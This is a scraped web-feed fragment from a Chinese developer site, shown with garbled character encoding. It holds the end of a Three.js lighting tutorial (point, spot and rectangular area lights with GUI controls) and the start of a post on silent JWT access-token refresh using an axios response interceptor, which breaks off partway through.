  <span class="hljs-keyword">const</span> pointLightHelper = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PointLightHelper</span>(pointLight);
  scene.<span class="hljs-title function_">add</span>(pointLightHelper);
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">updatePointLight</span>(<span class="hljs-params"/>) {
   <span class="hljs-comment">// å› ä¸ºç‚¹å…‰æºæ²¡æœ‰Â `target`Â å±æ€§ï¼Œæ‰€ä»¥Â `onChange`Â å‡½æ•°å¯ä»¥ç®€åŒ–ã€‚</span>
    pointLightHelper.<span class="hljs-title function_">update</span>();
  }

  <span class="hljs-comment">// æ·»åŠ  gui å±æ€§æ§åˆ¶</span>
  <span class="hljs-keyword">const</span> pointLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"ç‚¹å…‰æºæ§åˆ¶"</span>);
  gui.<span class="hljs-title function_">addColor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ColorGUIHelper</span>(pointLight, <span class="hljs-string">"color"</span>), <span class="hljs-string">"value"</span>).<span class="hljs-title function_">name</span>(<span class="hljs-string">"color"</span>);
  gui.<span class="hljs-title function_">add</span>(pointLight, <span class="hljs-string">"intensity"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">250</span>, <span class="hljs-number">1</span>);
  gui.<span class="hljs-title function_">add</span>(pointLight, <span class="hljs-string">"distance"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>).<span class="hljs-title function_">onChange</span>(updatePointLight);
  <span class="hljs-title function_">makeXYZGUI</span>(pointLightFolder, pointLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updatePointLight);
  
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/272dc31be014483aaa68fbbb1b65bc98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=dXTMCIz%2Bs6zbPzb3jn1blBLTXW8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FSpotLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/SpotLight" ref="nofollow noopener noreferrer"><code>SpotLight</code></a>èšå…‰ç¯</h2>
<p>èšå…‰ç¯å…‰æº, å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç‚¹å…‰æºè¢«ä¸€ä¸ªåœ†é”¥ä½“é™åˆ¶ä½äº†å…‰ç…§èŒƒå›´</p>
<p>ä½†å®é™…æœ‰ä¸¤ä¸ªåœ†é”¥, å†…åœ†é”¥å’Œå¤–åœ†é”¥, å…‰ç…§å¼ºåº¦åœ¨ä¸¤ä¸ªé”¥ä½“é—´ä»è®¾å®šçš„å¼ºåº¦é€’å‡åˆ° 0</p>
<p>ç±»ä¼¼æ–¹å‘å…‰ä¸€æ ·éœ€è¦ä¸€ä¸ªç›®æ ‡ç‚¹, å…‰æºä½ç½®æ˜¯åœ†é”¥çš„é¡¶ç‚¹, ç›®æ ‡ç‚¹å¤„äºåœ†é”¥çš„ä¸­è½´çº¿ä¸Š</p>
<p>å¸¸ç”¨äºèšå…‰ç¯ã€æ‰‹ç”µç­’ç¯å…‰, æœ‰é˜´å½±</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> spotColor = <span class="hljs-number">0xffffff</span>;
  <span class="hljs-keyword">const</span> spotIntensity = <span class="hljs-number">150</span>;
  <span class="hljs-keyword">const</span> spotLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SpotLight</span>(spotColor, spotIntensity);
  spotLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);
  spotLight.<span class="hljs-property">angle</span> = <span class="hljs-number">10</span>; <span class="hljs-comment">// èšå…‰ç¯ç…§å°„è§’åº¦ï¼Œå•ä½ï¼šå¼§åº¦</span>
  scene.<span class="hljs-title function_">add</span>(spotLight);
  <span class="hljs-comment">// è¦å°†ç›®æ ‡ä½ç½®æ›´æ”¹ä¸ºé»˜è®¤å€¼ä»¥å¤–çš„ä»»ä½•ä½ç½®ï¼Œå¿…é¡»å°†å…¶æ·»åŠ åˆ°åœºæ™¯ä¸­ã€‚</span>
  scene.<span class="hljs-title function_">add</span>(spotLight.<span class="hljs-property">target</span>);

  <span class="hljs-keyword">const</span> spotHelper = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SpotLightHelper</span>(spotLight);
  scene.<span class="hljs-title function_">add</span>(spotHelper);
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSpotLight</span>(<span class="hljs-params"/>) {
    spotHelper.<span class="hljs-title function_">update</span>();
  }
    
   <span class="hljs-comment">// æ·»åŠ  gui æ§åˆ¶</span>
  <span class="hljs-keyword">const</span> spotLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"èšå…‰ç¯æ§åˆ¶"</span>);
  <span class="hljs-comment">// èšå…‰ç¯çš„åœ†é”¥é¡¶éƒ¨å¤§å°é€šè¿‡ angle å±æ€§æ§åˆ¶</span>
  <span class="hljs-comment">// ä»¥å¼§åº¦ä½œå•ä½</span>
  spotLightFolder
    .<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DegRadHelper</span>(spotLight, <span class="hljs-string">"angle"</span>), <span class="hljs-string">"value"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>)
    .<span class="hljs-title function_">name</span>(<span class="hljs-string">"angle"</span>)
    .<span class="hljs-title function_">onChange</span>(updateSpotLight);
    
  <span class="hljs-comment">// penumbraä¸º 0 æ—¶, å†…å¤–åœ†é”¥å¤§å°ä¸€è‡´</span>
  <span class="hljs-comment">// penumbraä¸º 1 æ—¶, å†…åœ†é”¥å¤§å°ä¸º 0, å…‰ç…§å¼ºåº¦ä»ä¸­è½´çº¿å¼€å§‹å‘å¤–é€’å‡</span>
  <span class="hljs-comment">// penumbra ä¸º 0.5 æ—¶,å…‰ç…§å¼ºåº¦ä»å¤–åœ†é”¥åŠå¾„çš„ä¸­ç‚¹å¤„å¼€å§‹å¾€å¤–é€’å‡</span>
  <span class="hljs-comment">// å…·ä½“è¡¨ç°ä¸ºèšå…‰ç¯æ‰“å‘çš„ä½ç½®çš„å…‰æ˜¯é”åˆ©è¿˜æ˜¯æ¨¡ç³Š</span>
  spotLightFolder.<span class="hljs-title function_">add</span>(spotLight, <span class="hljs-string">"penumbra"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0.01</span>).<span class="hljs-title function_">onChange</span>(updateSpotLight);
  <span class="hljs-title function_">makeXYZGUI</span>(spotLightFolder, spotLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updateSpotLight);
  

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea7e8a32c04347c5bb5132814c96a254~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=0mP3ynTJ2gRktPCLIhyVWPfAgds%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b664ae5e6dc4f9590bfeac6b51262be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=u4tV7MJP3JRjRfHGNcCf5Bkv8To%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FRectAreaLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/RectAreaLight" ref="nofollow noopener noreferrer"><code>RectAreaLight</code></a> çŸ©é˜µåŒºåŸŸå…‰æº</h2>
<p>çŸ©å½¢åŒºåŸŸå…‰æº, è¡¨ç¤ºä¸€ä¸ªçŸ©å½¢åŒºåŸŸå‘å°„å‡ºæ¥çš„å…‰ç…§</p>
<p>ä¾‹å¦‚é•¿æ¡æ—¥å…‰ç¯æˆ–å¤©èŠ±ç£¨ç ‚ç»ç’ƒé€è¿›æ¥çš„è‡ªç„¶å…‰</p>
<p>åªèƒ½å½±å“<code>MeshStandardMaterial</code> å’Œ <code>MeshPhysicalMaterial</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç”±äºå…‰ç…§è®¡ç®—å¤æ‚, å°†å…¶ç€è‰²åˆ†ç¦»åˆ°å•ç‹¬åº“ä¸­, éœ€è¦æ‰‹åŠ¨å¼•å…¥ RectAreaLightUniformsLib å’Œ RectAreaLightHelper</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RectAreaLightUniformsLib</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"three/addons/lights/RectAreaLightUniformsLib.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RectAreaLightHelper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"three/addons/helpers/RectAreaLightHelper.js"</span>;
<span class="hljs-comment">// åˆå§‹åŒ–</span>
<span class="hljs-title class_">RectAreaLightUniformsLib</span>.<span class="hljs-title function_">init</span>();


<span class="hljs-keyword">const</span> rectColor = <span class="hljs-number">0xffffff</span>;
<span class="hljs-keyword">const</span> rectIntensity = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> rectWidth = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> rectHeight = <span class="hljs-number">4</span>;
<span class="hljs-keyword">const</span> rectLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">RectAreaLight</span>(rectColor, rectIntensity, rectWidth, rectHeight);
rectLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// ä¸å…¶ä»–å…‰çº¿ä¸åŒ, rectAreaLight ä¸æ˜¯ä½¿ç”¨ç›®æ ‡ç‚¹ï¼ˆ`target`ï¼‰ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªèº«çš„æ—‹è½¬è§’åº¦æ¥ç¡®å®šå…‰ç…§æ–¹å‘ã€‚</span>
rectLight.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">degToRad</span>(-<span class="hljs-number">90</span>);
scene.<span class="hljs-title function_">add</span>(rectLight);

<span class="hljs-comment">// å¦å¤–ï¼ŒçŸ©å½¢å…‰çš„è¾…åŠ©å¯¹è±¡åº”è¯¥æ·»åŠ ä¸ºå…‰ç…§çš„å­èŠ‚ç‚¹ï¼Œè€Œä¸æ˜¯æ·»åŠ ä¸ºåœºæ™¯çš„å­èŠ‚ç‚¹ã€‚</span>
<span class="hljs-keyword">const</span> rectHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RectAreaLightHelper</span>(rectLight);
rectLight.<span class="hljs-title function_">add</span>(rectHelper);


<span class="hljs-comment">// gui å±æ€§æ§åˆ¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateRectLight</span>(<span class="hljs-params"/>) {
    rectLight.<span class="hljs-title function_">updateMatrixWorld</span>();
  }
  <span class="hljs-keyword">const</span> rectLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"çŸ©å½¢åŒºåŸŸå…‰æ§åˆ¶"</span>);
  rectLightFolder.<span class="hljs-title function_">addColor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ColorGUIHelper</span>(rectLight, <span class="hljs-string">"color"</span>), <span class="hljs-string">"value"</span>).<span class="hljs-title function_">name</span>(<span class="hljs-string">"color"</span>);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"intensity"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"width"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  rectLightFolder.<span class="hljs-title function_">add</span>(rectLight, <span class="hljs-string">"height"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>).<span class="hljs-title function_">onChange</span>(updateRectLight);
  <span class="hljs-title function_">makeXYZGUI</span>(rectLightFolder, rectLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updateRectLight);
  <span class="hljs-title function_">makeXYZGUI</span>(rectLightFolder, rectLight.<span class="hljs-property">rotation</span>, <span class="hljs-string">"rotation"</span>, updateRectLight);

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fbd396616584898971092b377262e74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z54yr5LiN54Ot:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770730366&amp;x-signature=rmY%2BfF%2FYhZ%2FfEDZHJiLm19S61DU%3D" alt="image.png" loading="lazy"/></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘çš„é¡¹ç›®å®æˆ˜ï¼ˆåä¸€ï¼‰- åŒ Tokenæ— æ„Ÿåˆ·æ–°ï¼šå‰ç«¯å¦‚ä½•ä¼˜é›…å¤„ç† JWT è¿‡æœŸé—®é¢˜]]></title>    <link>https://juejin.cn/post/7602440800296173614</link>    <guid>https://juejin.cn/post/7602440800296173614</guid>    <pubDate>2026-02-03T13:03:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296173614" data-draft-id="7602488966609764390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘çš„é¡¹ç›®å®æˆ˜ï¼ˆåä¸€ï¼‰- åŒ Tokenæ— æ„Ÿåˆ·æ–°ï¼šå‰ç«¯å¦‚ä½•ä¼˜é›…å¤„ç† JWT è¿‡æœŸé—®é¢˜  "/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-03T13:03:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ETA8"/> <meta itemprop="url" content="https://juejin.cn/user/608445545328347"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘çš„é¡¹ç›®å®æˆ˜ï¼ˆåä¸€ï¼‰- åŒ Tokenæ— æ„Ÿåˆ·æ–°ï¼šå‰ç«¯å¦‚ä½•ä¼˜é›…å¤„ç† JWT è¿‡æœŸé—®é¢˜  
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/608445545328347/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ETA8
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:03:43.000Z" title="Tue Feb 03 2026 13:03:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ã€Š[æˆ‘çš„é¡¹ç›®å®æˆ˜ï¼ˆåï¼‰] ç°ä»£ Web é‰´æƒä½“ç³»ï¼šä»ç™»å½•åˆ°åŒ Token æœºåˆ¶çš„å…¨æµç¨‹å®è·µã€‹ä¸­ï¼Œæˆ‘ä»¬å®Œæ•´æ¢³ç†äº†åç«¯å¦‚ä½•é€šè¿‡ <strong>JWT + Refresh Token</strong> æ„å»ºå®‰å…¨ã€å¯æ‰©å±•çš„èº«ä»½è®¤è¯ç³»ç»Ÿã€‚ä½†ä¸€ä¸ªå®Œæ•´çš„é‰´æƒé—­ç¯ï¼Œä¸ä»…éœ€è¦æœåŠ¡ç«¯çš„è®¾è®¡ï¼Œæ›´ç¦»ä¸å¼€å‰ç«¯å¯¹ token ç”Ÿå‘½å‘¨æœŸçš„ç²¾ç»†ç®¡ç†ã€‚</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å°†èšç„¦äºé‚£ä¸ªâ€œç”¨æˆ·æ­£åœ¨å†™ç¬”è®°ï¼Œçªç„¶è¯·æ±‚å¤±è´¥è·³å›ç™»å½•é¡µâ€çš„ç»å…¸ç—›ç‚¹ï¼Œæ·±å…¥æ¢è®¨ï¼š<strong>å‰ç«¯å¦‚ä½•å®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„â€œæ— æ„Ÿåˆ·æ–°â€ï¼Ÿ</strong></p>
<p>æˆ‘ä»¬å°†ä¸€æ­¥æ­¥è§£å†³å¹¶å‘æ§åˆ¶ã€è¯·æ±‚é‡è¯•ã€çŠ¶æ€åŒæ­¥ç­‰ä¸€ç³»åˆ—å·¥ç¨‹éš¾é¢˜ï¼Œæ„å»ºå‡ºä¸€å¥—ç¨³å®šã€ä½ä¾µå…¥ã€é€‚ç”¨äºçœŸå®é¡¹ç›®çš„å“åº”æ‹¦æˆªæœºåˆ¶ï¼Œå¹¶è§£æå…¶èƒŒåçš„è®¾è®¡å“²å­¦ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€é—®é¢˜çš„æœ¬è´¨ï¼š401 ä¸ç­‰äºâ€œè¯·ç™»å½•â€</h2>
<p>å½“æˆ‘ä»¬ä½¿ç”¨ JWT åšèº«ä»½è®¤è¯æ—¶ï¼Œæ€»ä¼šé‡åˆ°è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼š</p>
<blockquote>
<p>ç”¨æˆ· A ç™»å½•æˆåŠŸï¼Œæ‹¿åˆ°æœ‰æ•ˆæœŸä¸º 15 åˆ†é’Ÿçš„ <code>access_token</code>ã€‚<br/>
ç¬¬ 16 åˆ†é’Ÿï¼Œä»–ç‚¹å‡»ä¿å­˜è‰ç¨¿ï¼Œæ¥å£è¿”å› <code>401 Unauthorized</code>ã€‚</p>
</blockquote>
<p>æ­¤æ—¶ï¼Œå¦‚æœç›´æ¥å¼¹çª—æç¤ºâ€œç™»å½•å·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•â€ï¼Œä½“éªŒæ˜¯éå¸¸å‰²è£‚çš„â€”â€”ç”¨æˆ·æ˜æ˜ä¸€ç›´åœ¨æ“ä½œï¼Œå‡­ä»€ä¹ˆè¯´æ²¡å°±æ²¡ï¼Ÿ</p>
<p>ä½†å¦‚æœæˆ‘ä»¬èƒ½åœ¨è¿™èƒŒåæ‚„æ‚„å®Œæˆä¸€æ¬¡ token åˆ·æ–°ï¼Œå¹¶æŠŠåˆšæ‰å¤±è´¥çš„è¯·æ±‚è‡ªåŠ¨é‡è¯•ï¼Œæ•´ä¸ªè¿‡ç¨‹ç”¨æˆ·å®Œå…¨æ— æ„ŸçŸ¥ï¼Œè¿™å°±å« <strong>â€œæ— æ„Ÿåˆ·æ–°â€</strong>ã€‚</p>
<p>è€Œå®ç°å®ƒçš„å…³é”®ï¼Œåœ¨äºæ­£ç¡®ç†è§£ <strong>401 çš„è¯­ä¹‰å·®å¼‚</strong>ï¼š</p>




















<table><thead><tr><th>åœºæ™¯</th><th>å«ä¹‰</th><th>åº”å¯¹ç­–ç•¥</th></tr></thead><tbody><tr><td>access_token è¿‡æœŸ</td><td>å¯æ¢å¤çš„çŠ¶æ€å¼‚å¸¸</td><td>è‡ªåŠ¨åˆ·æ–°ï¼Œé‡è¯•è¯·æ±‚</td></tr><tr><td>refresh_token å¤±æ•ˆ / ç”¨æˆ·ç™»å‡º</td><td>èº«ä»½å½»åº•å¤±æ•ˆ</td><td>å¼•å¯¼é‡æ–°ç™»å½•</td></tr></tbody></table>
<p>æˆ‘ä»¬çš„ç›®æ ‡ï¼Œå°±æ˜¯ç²¾å‡†è¯†åˆ«ç¬¬ä¸€ç§æƒ…å†µï¼Œå¹¶åœ¨ä¸å¹²æ‰°ç”¨æˆ·çš„å‰æä¸‹å®Œæˆè‡ªæ•‘ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€åˆæ­¥å°è¯•ï¼šæœ€ç®€å•çš„åˆ·æ–°é€»è¾‘</h2>
<p>å…ˆæ¥çœ‹ä¸€ä¸ªæœ´ç´ ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-property">data</span>,
  <span class="hljs-keyword">async</span> error =&gt; {
    <span class="hljs-keyword">const</span> { config, response } = error;

    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
      <span class="hljs-comment">// å°è¯•åˆ·æ–° token</span>
      <span class="hljs-keyword">const</span> newToken = <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshToken</span>();
      <span class="hljs-comment">// ä¿®æ”¹åŸè¯·æ±‚ header</span>
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>;
      <span class="hljs-comment">// é‡æ–°å‘é€</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">axios</span>(config);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
  }
);
</code></pre>
<p>çœ‹èµ·æ¥æ²¡é—®é¢˜ï¼Ÿå…¶å®éšæ‚£é‡é‡ã€‚</p>
<h3 data-id="heading-2">âŒ é—®é¢˜ 1ï¼šå¹¶å‘è¯·æ±‚å¯¼è‡´å¤šæ¬¡åˆ·æ–°</h3>
<p>å‡è®¾é¡µé¢åŒæ—¶å‘å‡ºä¸‰ä¸ªè¯·æ±‚ Aã€Bã€Cï¼Œå®ƒä»¬å‡ ä¹åŒæ—¶å›  token è¿‡æœŸè¿”å› 401ã€‚é‚£ä¹ˆè¿™ä¸‰æ¡éƒ½ä¼šè¿›å…¥ä¸Šè¿°é€»è¾‘ï¼Œç»“æœæ˜¯ï¼š</p>
<ul>
<li>ä¸‰æ¬¡è°ƒç”¨ <code>/auth/refresh</code></li>
<li>å¯èƒ½è§¦å‘æœåŠ¡ç«¯é˜²é‡æ”¾æœºåˆ¶å¯¼è‡´åç»­å¤±è´¥</li>
<li>æœ€ç»ˆçŠ¶æ€æ··ä¹±</li>
</ul>
<h3 data-id="heading-3">âŒ é—®é¢˜ 2ï¼šB å’Œ C è¯·æ±‚æ°¸è¿œä¸¢å¤±</h3>
<p>A å¼€å§‹åˆ·æ–°ï¼ŒB å’Œ C ä¸åº”è¯¥ç«‹å³é‡è¯•ï¼Œè€Œåº”ç­‰å¾… A æ‹¿åˆ°æ–° token åå†ç»§ç»­ã€‚å¦åˆ™ä¼šå‡ºç°ï¼š</p>
<ul>
